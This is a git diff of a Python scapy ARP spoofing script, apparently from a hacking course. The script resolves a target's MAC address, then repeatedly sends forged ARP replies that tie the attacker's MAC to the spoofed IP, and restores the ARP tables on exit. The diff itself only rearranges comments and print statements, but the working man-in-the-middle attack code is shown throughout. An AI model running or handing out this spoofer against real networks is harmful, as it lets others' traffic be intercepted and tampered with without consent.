@@ -17,9 +17,8 @@ def get_arguments():
         parser.error("[-] Please specify a spoof ip, use --help for more info.")
     return options
 
-
+# Create arp request directed to broadcast MAC asking for IP
 def get_mac(ip):
-    # Create arp request directed to broadcast MAC asking for IP
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
@@ -28,7 +27,7 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
-
+# Create arp response to associate our MAC address to spoof_ip or to restore the MAC address
 def spoof_restore(target_ip, target_mac, spoof_ip, restore_mac_source=""):
     if restore_mac_source == "":
         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
@@ -48,8 +47,8 @@ try:
         spoof_restore(options.spoof, spoof_mac, options.target)
         sent_packet_count = sent_packet_count + 2
         print("\r[+] Packets sent: " + str(sent_packet_count)),
-        # print("\r[+] Packets sent: " + str(sent_packet_count), end="")
-        sys.stdout.flush()
+        sys.stdout.flush()  # Added '\r', a comma and this so it turns into a dynamic printing
+        # print("\r[+] Packets sent: " + str(sent_packet_count), end="")   python3
         time.sleep(2)
 except KeyboardInterrupt:
     # Restore parameters before quitting
